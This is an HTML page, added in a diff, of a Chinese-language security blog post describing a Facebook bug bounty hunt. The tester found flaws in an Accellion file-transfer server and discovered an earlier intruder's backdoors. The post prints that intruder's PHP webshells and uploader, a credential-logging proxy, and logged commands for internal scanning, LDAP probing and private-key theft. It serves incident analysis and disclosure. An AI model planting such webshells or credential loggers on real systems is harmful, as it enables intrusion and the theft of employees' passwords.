@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+  <head>
+    <meta charset="utf-8" />
+    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>滲透 Facebook 的思路與發現 — DEVCORE 戴夫寇爾</title><link href="/stylesheets/webpack_bundle.css" rel="stylesheet" /><meta content="DEVCORE 戴夫寇爾" property="og:title" />
+    <meta content="DEVCORE 戴夫寇爾" property="og:site_name" />
+    <meta content="http://core.dev/" property="og:url" />
+    <meta content="http://core.dev/images/fb.png" property="og:image" />
+    <meta content="戴夫寇爾以真實的滲透測試、顧問服務、教育訓練，保護你的商業價值。" property="og:description" />
+    <meta content="website" property="og:type" />
+    <meta content="612130717" property="fb:admins" />
+  </head>
+  <body class="blog blog_2016 blog_2016_04 blog_2016_04_21 blog_2016_04_21_how-I-hacked-facebook-and-found-someones-backdoor-script zh">
+    <div class="page">
+      <div class="container--wrapper">
+        <div class="topbar">
+          <div class="topbar__brand">
+            <a href="/">
+                <div class="logo">
+                  DEVCORE 戴夫寇爾
+                </div></a>
+            <p class="slogan">
+              我們提供<a href="/services/penetration-test.html" class="link">滲透測試</a>、<a href="/services/security-consulting.html" class="link">資安顧問</a>與<a href="/services/security-training.html" class="link">教育訓練</a>專業服務
+            </p>
+          </div>
+          <div class="drawer" id="drawer">
+            <div class="drawer__container">
+              <nav class="main-menu">
+                <div class="hidden">
+                  主選單
+                </div>
+                <a href="/services/penetration-test.html" class="main-menu__link mobile-only">滲透測試</a>
+                <a href="/services/security-consulting.html" class="main-menu__link mobile-only">資安顧問</a>
+                <a href="/services/security-training.html" class="main-menu__link mobile-only">教育訓練</a>
+                <a href="/services/security-seal.html" class="main-menu__link mobile-only">網站安全標章</a><a href="/about.html" class="main-menu__link">駭客思維</a><a href="/blog/" class="main-menu__link">最新訊息</a><a href="/blog/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">搜尋</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
+              </nav>
+              <a href="/contact.html" class="drawer__contact button--dense">聯絡我們</a>
+              <nav class="lang-menu">
+                <div class="lang-menu__label">
+                  語言:
+                </div>
+                <a href="http://core.dev/" class="lang-menu__link">中文</a>
+                <a href="http://core.dev/en/" class="lang-menu__link">English</a>
+              </nav>
+            </div>
+          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
+            <div class="bars">
+              <div class="bar"></div>
+              <div class="bar"></div>
+              <div class="bar"></div>
+            </div>
+          </button>
+        </div>
+      </div>
+      <main role="main"><div class="container--wrapper">
+  <div class="container">
+    <section class="blog-header">
+      <small class="blog-header__category"><a href="#link">案例剖析</a></small><img src="/images/blog/20160421/facebook-bb1d9645.jpg" class="blog-header__image" alt="Facebook" />
+      <h1 class="blog-header__title">
+        滲透 Facebook 的思路與發現
+      </h1>
+      <div class="blog-header__tags">
+        <a href="/blog/tag/haker.html" class="blog-header__tag">Facebook</a>
+        <a href="/blog/tag/haker.html" class="blog-header__tag">BugBounty</a>
+        <a href="/blog/tag/haker.html" class="blog-header__tag">RCE</a>
+        <a href="/blog/tag/haker.html" class="blog-header__tag">Backdoor</a>
+        <a href="/blog/tag/haker.html" class="blog-header__tag">Reconnaissance</a>
+        <a href="/blog/tag/haker.html" class="blog-header__tag">Pentest</a>
+      </div>
+      <p class="blog-header__info">
+        Written by <span class="blog-author-photo" style="background-image: url(/images/member-orange-879c85c7.jpg)"></span> <a href="/blog/author/Allen%20Own.html" class="author-name">Allen Own</a> <time class="date">on 2016-09-22 </time>
+      </p>
+    </section>
+    <article class="article"><h3 id="section">寫在故事之前</h3>
+
+<p>身為一位滲透測試人員，比起 Client Side 的弱點我更喜歡 Server Side 的攻擊，能夠直接的控制伺服器、獲得權限操作 SHELL 才爽 &lt;(￣︶￣)&gt;</p>
+
+<p>當然一次完美的滲透任何形式的弱點都不可小覷，在實際滲透時偶爾還是需要些 Client Side 弱點組合可以更完美的控制伺服器，但是在尋找弱點時我本身還是先偏向以可直接進入伺服器的方式來去尋找風險高、能長驅直入的弱點。</p>
+
+<p>隨著 Facebook 在世界上越來越火紅、用戶量越來越多，一直以來都有想要嘗試看看的想法，恰巧 Facebook 在 2012 年開始有了 <a href="https://www.facebook.com/whitehat/">Bug Bounty</a> 獎金獵人的機制讓我更躍躍欲試。</p>
+
+<p></p>
+
+<p>一般如由滲透的角度來說習慣性都會從收集資料、偵查開始，首先界定出目標在網路上的 "範圍" 有多大，姑且可以評估一下從何處比較有機會下手。例如:</p>
+
+<ul>
+  <li>Google Hacking 到什麼資料?</li>
+  <li>用了幾個 B 段的 IP ? C 段的 IP ?</li>
+  <li>Whois? Reverse Whois?</li>
+  <li>用了什麼域名? 內部使用的域名? 接著做子域名的猜測、掃描</li>
+  <li>公司平常愛用什麼樣技術、設備?</li>
+  <li>在 Github, Pastebin 上是否有洩漏什麼資訊?</li>
+  <li>…etc</li>
+</ul>
+
+<p>當然 Bug Bounty 並不是讓你無限制的攻擊，將所蒐集到的範圍與 Bug Bounty 所允許的範圍做交集後才是你真正可以去嘗試的目標。</p>
+
+<p>一般來說大公司在滲透中比較容易出現的問題點這裡舉幾個例子來探討</p>
+
+<ol>
+  <li>對多數大公司而言，"<strong>網路邊界</strong>" 是比較難顧及、容易出現問題的一塊，當公司規模越大，同時擁有數千、數萬台機器在線，網管很難顧及到每台機器。在攻防裡，防守要防的是一個面，但攻擊只需找個一個點就可以突破，所以防守方相對處於弱勢，攻擊者只要找到一台位於網路邊界的機器入侵進去就可以開始在內網進行滲透了!</li>
+  <li>對於 "<strong>連網設備</strong>" 的安全意識相對薄弱，由於連網設備通常不會提供 SHELL 給管理員做進一步的操作，只能由設備本身所提供的介面設定，所以通常對於設備的防禦都是從網路層來抵擋，但如遇到設備本身的 0-Day 或者是 1-Day 可能連被入侵了都不自覺。</li>
+  <li>人的安全，隨著 "<strong>社工庫</strong>" 的崛起，有時可以讓一次滲透的流程變得異常簡單，從公開資料找出公司員工列表，再從社工庫找到可以登入 VPN 的員工密碼就可以開始進行內網滲透，尤其當社工庫數量越來越多 "<strong>量變成質變</strong>" 時只要關鍵人物的密碼在社工庫中可找到，那企業的安全性就全然突破 :P
+<br /></li>
+</ol>
+
+<p>理所當然在尋找 Facebook 弱點時會以平常進行滲透的思路進行，在開始搜集資料時除了針對 Facebook 本身域名查詢外也對註冊信箱進行 Reverse Whois 意外發現了個奇妙的域名名稱</p>
+
+<pre><code>tfbnw.net
+</code></pre>
+
+<p>TFBNW 似乎是 "<strong>TheFacebook Network</strong>" 的縮寫<br />
+再藉由公開資料發現存在下面這台這台伺服器</p>
+
+<pre><code>vpn.tfbnw.net
+</code></pre>
+
+<p>哇! vpn.tfbnw.net 看起來是個 Juniper SSL VPN 的登入介面，不過版本滿新的沒有直接可利用的弱點，不過這也成為了進入後面故事的開端。</p>
+
+<p>TFBNW 看似是 Facebook 內部用的域名，來掃掃 vpn.tfbnw.net 同網段看會有什麼發現</p>
+
+<ul>
+  <li>Mail Server Outlook Web App</li>
+  <li>F5 BIGIP SSL VPN</li>
+  <li>CISCO ASA SSL VPN</li>
+  <li>Oracle E-Business</li>
+  <li>MobileIron MDM</li>
+</ul>
+
+<p>從這幾台機器大致可以判斷這個網段對於 Facebook 來說應該是相對重要的網段，之後一切的故事就從這裡開始。</p>
+
+<hr />
+
+<h3 id="section-1">弱點發現</h3>
+
+<p>在同網段中，發現一台特別的伺服器</p>
+
+<pre><code>files.fb.com
+</code></pre>
+
+<p><img src="/images/blog/20160421/1-b2966f00.jpg" alt="files.fb.com" />
+<em>↑ files.fb.com 登入介面</em></p>
+
+<p><br /></p>
+
+<p>從 LOGO 以及 Footer 判斷應該是 Accellion 的 Secure File Transfer (以下簡稱 FTA)</p>
+
+<p>FTA 為一款標榜安全檔案傳輸的產品，可讓使用者線上分享、同步檔案，並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制，Enterprise 版本更支援 SSL VPN 服務。</p>
+
+<p>首先看到 FTA 的第一件事是去網路上搜尋是否有公開的 Exploit 可以利用，Exploit 最近的是由 HD Moore 發現並發佈在 Rapid7 的這篇 Advisory</p>
+
+<ul>
+  <li><a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857">Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)</a></li>
+</ul>
+
+<p>弱點中可直接從 "<strong>/tws/getStatus</strong>" 中洩漏的版本資訊判斷是否可利用，在發現 files.fb.com 時版本已從有漏洞的 0.18 升級至 0.20 了，不過就從 Advisory 中所透露的片段程式碼感覺 FTA 的撰寫風格如果再繼續挖掘可能還是會有問題存在的，所以這時的策略便開始往尋找 FTA 產品的 0-Day 前進!</p>
+
+<p>不過從實際黑箱的方式其實找不出什麼問題點只好想辦法將方向轉為白箱測試，透過各種方式拿到舊版的 FTA 原始碼後終於可以開始研究了!</p>
+
+<p>整個 FTA 產品大致架構</p>
+
+<ol>
+  <li>網頁端介面主要由 Perl 以及 PHP 構成</li>
+  <li>PHP 原始碼皆經過 IonCube 加密</li>
+  <li>在背景跑了許多 Perl 的 Daemon</li>
+</ol>
+
+<p>首先是解密 IonCude 的部分，許多設備為了防止自己的產品被檢視所以會將原始碼加密，不過好在 FTA 上的 IonCude 版本沒到最新，可以使用現成的工具解密，不過由於 PHP 版本的問題，細節部份以及數值運算等可能要靠自己修復一下，不然有點難看…</p>
+
+<p>經過簡單的原始碼審查後發現，好找的弱點應該都被 Rapid7 找走了 T^T<br />
+而需要認證才能觸發的漏洞又不怎麼好用，只好認真點往深層一點的地方挖掘!</p>
+
+<p>經過幾天的認真挖掘，最後總共發現了七個弱點，其中包含了</p>
+
+<ul>
+  <li>Cross-Site Scripting x 3</li>
+  <li>Pre-Auth SQL Injection leads to Remote Code Execution</li>
+  <li>Known-Secret-Key leads to Remote Code Execution</li>
+  <li>Local Privilege Escalation x 2</li>
+</ul>
+
+<p>除了回報 Facebook 安全團隊外，其餘的弱點也製作成 Advisory 提交 Accellion 技術窗口，經過廠商修補提交 CERT/CC 後取得四個 CVE 編號</p>
+
+<ul>
+  <li>CVE-2016-2350</li>
+  <li>CVE-2016-2351</li>
+  <li>CVE-2016-2352</li>
+  <li>CVE-2016-2353</li>
+</ul>
+
+<p>詳細的弱點細節會待 Full Disclosure Policy 後公布!</p>
+
+<p><img src="/images/blog/20160421/2-3a353bd8.jpg" alt="shell on facebook" />
+<em>↑ 使用 Pre-Auth SQL Injection 寫入 Webshell</em></p>
+
+<p><br /></p>
+
+<p>在實際滲透中進去伺服器後的第一件事情就是檢視當前的環境是否對自己友善，為了要讓自己可以在伺服器上待的久就要盡可能的了解伺服器上有何限制、紀錄，避開可能會被發現的風險 :P</p>
+
+<p>Facebook 大致有以下限制:</p>
+
+<ol>
+  <li>防火牆無法連外, TCP, UDP, 53, 80, 443 皆無法</li>
+  <li>存在遠端的 Syslog 伺服器</li>
+  <li>開啟 Auditd 記錄</li>
+</ol>
+
+<p>無法外連看起來有點麻煩，但是 ICMP Tunnel 看似是可行的，但這只是一個 Bug Bounty Program 其實不需要太麻煩就純粹以 Webshell 操作即可。</p>
+
+<hr />
+
+<h3 id="section-2">似乎有點奇怪?</h3>
+
+<p>正當收集證據準備回報 Facebook 安全團隊時，從網頁日誌中似乎看到一些奇怪的痕跡。</p>
+
+<p>首先是在 "<strong>/var/opt/apache/php_error_log</strong>" 中看到一些奇怪的 PHP 錯誤訊息，從錯誤訊息來看似乎像是邊改 Code 邊執行所產生的錯誤?</p>
+
+<p><img src="/images/blog/20160421/3-e4fb0600.jpg" alt="PHP error log" />
+<em>↑ PHP error log</em></p>
+
+<p><br />
+跟隨錯誤訊息的路徑去看發現疑似前人留下的 Webshell 後門</p>
+
+<p><img src="/images/blog/20160421/4-ba11f7b6.jpg" alt="Webshell on facebook server" />
+<em>↑ Webshell on facebook server</em></p>
+
+<p><br /></p>
+
+<p>其中幾個檔案的內容如下</p>
+
+<div class="highlight-name">sshpass</div>
+<pre><code>沒錯，就是那個 <a href="http://linux.die.net/man/1/sshpass">sshpass</a></code></pre>
+<div class="highlight-name">bN3d10Aw.php</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+<div class="highlight-name">uploader.php</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f]["</span><span class="nx">tmp_name</span><span class="s2">"], basename(</span><span class="si">$_FILES["f"]</span><span class="s2">["</span><span class="nx">name</span><span class="s2">"])); ?&gt;</span></code></pre></div>
+
+<div class="highlight-name">d.php</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">include_oncce</span><span class="p">(</span><span class="s2">"/home/seos/courier/remote.inc"</span><span class="p">);</span> <span class="k">echo</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"c"</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+
+<div class="highlight-name">sclient\_user\_class\_standard.inc</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s1">'sclient_user_class_standard.inc.orig'</span><span class="p">);</span>
+<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"/home/seos/courier/B3dKe9sQaa0L.log"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+<span class="nv">$retries</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$max_retries</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+
+<span class="c1">// 省略...</span>
+
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"Y-m-d H:i:s T"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">";"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">";"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"HTTP_USER_AGENT"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">";POST="</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="o">.</span> <span class="s2">";GET="</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="o">.</span> <span class="s2">";COOKIE="</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+
+<span class="c1">// 省略...</span></code></pre></div>
+
+<p>前幾個就是很標準的 PHP 一句話木馬<br />
+其中比較特別的是 "<strong>sclient_user_class_standard.inc</strong>" 這個檔案</p>
+
+<p>include_once 中 "<strong>sclient_user_class_standard.inc.orig</strong>" 為原本對密碼進行驗證的 PHP 程式，駭客做了一個 Proxy 在中間並在進行一些重要操作時先把 GET, POST, COOKIE 的值記錄起來</p>
+
+<p>整理一下，駭客做了一個 Proxy 在密碼驗證的地方，並且記錄 Facebook 員工的帳號密碼，並且將記錄到的密碼放置在 Web 目錄下，駭客每隔一段時間使用   wget 抓取</p>
+
+<pre><code>wget https://files.fb.com/courier/B3dKe9sQaa0L.log
+</code></pre>
+
+<p><img src="/images/blog/20160421/5-c9667bd8.jpg" alt="logged password" />
+<em>↑ Logged passwords</em></p>
+
+<p><br /></p>
+
+<p>從紀錄裡面可以看到除了使用者帳號密碼外，還有從 FTA 要求檔案時的信件內容，記錄到的帳號密碼會定時 Rotate (後文會提及，這點還滿機車的XD)</p>
+
+<p>發現當下，最近一次的 Rotate 從 2/1 記錄到 2/7 共約 300 筆帳號密碼紀錄，大多都是 "<strong>@fb.com</strong>" 或是 "<strong>@facebook.com</strong>" 的員工帳密，看到當下覺得事情有點嚴重了，在 FTA 中，使用者的登入主要有兩種模式</p>
+
+<ol>
+  <li>一般用戶註冊，密碼 Hash 存在資料庫，由 SHA256 + SALT 儲存</li>
+  <li>Facebook 員工 (@fb.com) 則走統一認證，使用 LDAP 由 AD 認證</li>
+</ol>
+
+<p>在這裡相信記錄到的是真實的員工帳號密碼，<strong>**猜測</strong>** 這份帳號密碼應該可以通行 Facebook Mail OWA, VPN 等服務做更進一步的滲透…</p>
+
+<p>此外，這名 "駭客" 可能習慣不太好 :P</p>
+
+<ol>
+  <li>後門參數皆使用 GET 來傳遞，在網頁日誌可以很明顯的發現他的足跡</li>
+  <li>駭客在進行一些指令操作時沒顧慮到 STDERR ，導致網頁日誌中很多指令的錯誤訊息，從中可以觀察駭客做了哪些操作</li>
+</ol>
+
+<p><br />
+從 access.log 可以觀察到的每隔數日駭客會將記錄到的帳號密碼清空<br />
+{% highlight prolog %}
+192.168.54.13 - - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] "GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p '<strong>**</strong>**' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &gt; /home/seos/courier/B3dKe9sQaa0L.log' 2&gt;/dev/stdout HTTP/1.1" 200 2559 …
+{% endhighlight %}
+<br /></p>
+
+<p>打包檔案
+{% highlight bash %}
+cat tmp_list3_2 | while read line; do cp /home/filex2/1000/$line files; done 2&gt;/dev/stdout
+tar -czvf files.tar.gz files
+{% endhighlight %}
+<br /></p>
+
+<p>對內部網路結構進行探測
+{% highlight tex %}
+dig a archibus.thefacebook.com
+telnet archibus.facebook.com 80
+curl http://archibus.thefacebook.com/spaceview_facebook/locator/room.php
+dig a records.fb.com
+telnet records.fb.com 80
+telnet records.fb.com 443
+wget -O- -q http://192.168.41.16
+dig a acme.facebook.com
+./sshpass -p '<strong>**</strong>**' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'for i in $(seq 201 1 255); do for j in $(seq 0 1 255); do echo "192.168.$i.$j:<code>dig +short ptr $j.$i.168.192.in-addr.arpa</code>"; done; done' 2&gt;/dev/stdout
+…
+{% endhighlight %}
+<br /></p>
+
+<p>使用 Shell Script 進行內網掃描但忘記把 STDERR 導掉XD</p>
+
+<p><img src="/images/blog/20160421/6-4f176b6e.jpg" alt="Port Scanning" />
+<br /></p>
+
+<p>嘗試對內部 LDAP 進行連接
+{% highlight tex %}
+sh: -c: line 0: syntax error near unexpected token <code>('
+sh: -c: line 0: </code>ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w '<strong>**</strong><em>*' -s base (objectclass=</em>) 2&gt;/dev/stdout'
+{% endhighlight %}
+<br /></p>
+
+<p>嘗試訪問內部網路資源<br />
+( 看起來 Mail OWA 可以直接訪問 …)<br />
+{% highlight text %}
+–20:38:09–  https://mail.thefacebook.com/
+Resolving mail.thefacebook.com… 192.168.52.37
+Connecting to mail.thefacebook.com|192.168.52.37|:443… connected.
+HTTP request sent, awaiting response… 302 Found
+Location: https://mail.thefacebook.com/owa/ [following]
+–20:38:10–  https://mail.thefacebook.com/owa/
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response… 302 Moved Temporarily
+Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0 [following]
+–20:38:10–  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response… 200 OK
+Length: 8902 (8.7K) [text/html]
+Saving to: `STDOUT'</p>
+
+<pre><code> 0K ........                                              100% 1.17G=0s
+</code></pre>
+
+<p>20:38:10 (1.17 GB/s) - `-' saved [8902/8902]</p>
+
+<p>–20:38:33–  (try:15)  https://10.8.151.47/
+Connecting to 10.8.151.47:443… –20:38:51–  https://svn.thefacebook.com/
+Resolving svn.thefacebook.com… failed: Name or service not known.
+–20:39:03–  https://sb-dev.thefacebook.com/
+Resolving sb-dev.thefacebook.com… failed: Name or service not known.
+failed: Connection timed out.
+Retrying.
+{% endhighlight %}
+<br /></p>
+
+<p>嘗試對 SSL Private Key 下手<br />
+{% highlight text %}
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
+mv: cannot stat <code>x': No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat </code>x': No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat <code>x': No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat </code>x': No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x': No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+base64: invalid input
+{% endhighlight %}
+<br /></p>
+
+<p>從瀏覽器觀察 files.fb.com 的憑證還是 Wildcard 的 *.fb.com …</p>
+
+<p><img src="/images/blog/20160421/7-a8d1f0e0.jpg" alt="certificate of files.fb.com" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<h3 id="section-3">後記</h3>
+
+<p>在收集完足夠證據後便立即回報給 Facebook 安全團隊，回報內容除了漏洞細節外，還附上相對應的 Log 、截圖以及時間紀錄xD</p>
+
+<p>從伺服器中的日誌可以發現有兩個時間點是明顯駭客在操作系統的時間，一個是七月初、另個是九月中旬</p>
+
+<p>七月初的動作從紀錄中來看起來比較偏向 "逛" 伺服器，但九月中旬的操作就比較惡意了，除了逛街外，還放置了密碼 Logger 等，至於兩個時間點的 "駭客" 是不是同一個人就不得而知了 :P<br />
+而七月發生的時機點正好接近 CVE-2015-2857 Exploit 公佈前，究竟是透過 1-Day 還是無 0-Day 入侵系統也無從得知了。</p>
+
+<p><br /></p>
+
+<p>這件事情就記錄到這裡，總體來說這是一個非常有趣的經歷xD<br />
+也讓我有這個機會可以來寫寫關於滲透的一些文章 :P</p>
+
+<p>最後也感謝 Bug Bounty 及胸襟寬闊的 Facebook 安全團隊 讓我可以完整記錄這起事件 : )</p>
+
+<hr />
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+  <li>2016/02/05 20:05 提供漏洞詳情給 Facebook 安全團隊</li>
+  <li>2016/02/05 20:08 收到機器人自動回覆</li>
+  <li>2016/02/06 05:21 提供弱點 Advisory 給 Accellion 技術窗口</li>
+  <li>2016/02/06 07:42 收到 Thomas 的回覆，告知調查中</li>
+  <li>2016/02/13 07:43 收到 Reginaldo 的回覆，告知 Bug Bounty 獎金 $10000 USD</li>
+  <li>2016/02/13 詢問是否撰寫 Blog 是否有任何要注意的地方?</li>
+  <li>2016/02/13 詢問此漏洞被認為是 RCE 還是 SQL Injection</li>
+  <li>2016/02/18 收到 Reginaldo 的回覆，告知正在進行調查中，希望 Blog 先暫時不要發出</li>
+  <li>2016/02/24 收到 Hai 的回覆，告知獎金將會於三月發送</li>
+  <li>2016/04/20 收到 Reginaldo 的回覆，告知調查已完成</li>
+</ul>
+
+    </article>
+    <p class="sns-widgets">
+      Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
+    </p><div class="heading--side-lined">
+      About <span class="blog-author-photo" style="background-image: url(/images/member-orange-879c85c7.jpg)"></span> <span class="blog-author-name">Allen Own</span> 
+    </div>
+    <p class="blog-author-info">
+      具備多年駭客技術研究以及網路管理經驗，擔任學術及政府單位專任講師及顧問。專長於網站應用程式安全、滲透測試、伺服器建置及開發、專業教育訓練。
+    </p><div class="heading--side-lined">
+      讀者留言
+    </div>
+    <div class="blog-comments">
+      DISQUS 塞這裡
+    </div>
+  </div>
+</div></main>
+      <div class="container--wrapper">
+        <div class="relative-posts">
+          <div class="heading--side-lined container">
+            相關文章
+          </div>
+          <div class="relative-posts__cells">
+            <section class="card">
+              <a href="/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script.html">
+                <div class="card__thumbnail" style="background-image: url(/images/blog-thumbnail-0-98e2cb44.jpg)"></div>
+                <h3 class="card__title">
+                  WEB2PY 反序列化的安全問題－CVE-2016-3957
+                </h3></a>
+              <div class="card__tags">
+                <a href="#link" class="card__tag">Advisory</a>
+                <a href="#link" class="card__tag">Facebook</a>
+                <a href="#link" class="card__tag">BugBounty</a>
+                <a href="#link" class="card__tag">RCE</a>
+                <a href="#link" class="card__tag">CVE</a>
+              </div>
+              <small class="card__category"><a href="#link">技術專欄</a></small>
+            </section>
+            <section class="card">
+              <a href="/blog/2014/10/13/android-webview-left-shortcuts-for-hacker.html">
+                <div class="card__thumbnail" style="background-image: url(/images/blog-thumbnail-1-95c2e1f4.jpg)"></div>
+                <h3 class="card__title">
+                  IoT設備商別成為幫兇 從Dyn DDoS攻擊事件看IoT安全
+                </h3></a>
+              <div class="card__tags">
+                <a href="#link" class="card__tag">Mobile</a>
+                <a href="#link" class="card__tag">Android</a>
+                <a href="#link" class="card__tag">WebView</a>
+                <a href="#link" class="card__tag">UXSS</a>
+              </div>
+              <small class="card__category"><a href="#link">技術專欄</a></small>
+            </section>
+            <section class="card">
+              <a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver.html">
+                <div class="card__thumbnail" style="background-image: url(/images/blog-thumbnail-2-a989726c.jpg)"></div>
+                <h3 class="card__title">
+                  Accellion File Transfer Appliance 弱點報告
+                </h3></a>
+              <div class="card__tags">
+                <a href="#link" class="card__tag">Facebook</a>
+                <a href="#link" class="card__tag">BugBounty</a>
+                <a href="#link" class="card__tag">RCE</a>
+                <a href="#link" class="card__tag">Backdoor</a>
+                <a href="#link" class="card__tag">Reconnaissance</a>
+                <a href="#link" class="card__tag">Pentest</a>
+              </div>
+              <small class="card__category"><a href="#link">技術專欄</a></small>
+            </section>
+          </div>
+        </div><div class="contact-section container">
+          <h2 class="contact-section__title">
+            用最真實的攻擊，驗證企業的防禦
+          </h2>
+          <a href="/contact.html" class="home-contact__button button--dense">聯絡我們</a>
+        </div><footer class="main-footer">
+          <div class="main-footer__about">
+            戴夫寇爾提供<br class="mobile-only" /><a href="/services/penetration-test.html" class="link">滲透測試</a>、<a href="/services/security-consulting.html" class="link">資安顧問</a>與<a href="/services/security-training.html" class="link">教育訓練</a>專業服務<br />在<a href="https://www.facebook.com/D3VC0RE" class="link">Facebook</a>或<a href="https://twitter.com/d3vc0r3" class="link">Twitter</a>上追蹤我們的<a href="/blog/" class="link">最新訊息</a><br />瞭解更多戴夫寇爾的<a href="/about.html" class="link">駭客思維</a>
+          </div>
+          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns">
+                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://plus.google.com/118439315679478709768/posts" class="main-footer__sns">
+                <svg class="icon-googleplus icon"><use xlink:href="#icon-googleplus" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns">
+                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
+          </div>
+          <address class="main-footer__address">
+            <ul class="list--unstyled">
+              <li>
+                地址 10487 台北市中山區復興北路168號10樓
+              </li>
+              <li>
+                Email contact@devco.re
+              </li>
+              <li>
+                電話 02-2718-0156
+              </li>
+              <li>
+                統編 53955237
+              </li>
+            </ul>
+          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2016 DEVCORE 戴夫寇爾</small>
+        </footer>
+      </div>
+    </div>
+    <script src="/javascripts/webpack_bundle.js"></script>
+  </body>
+</html>
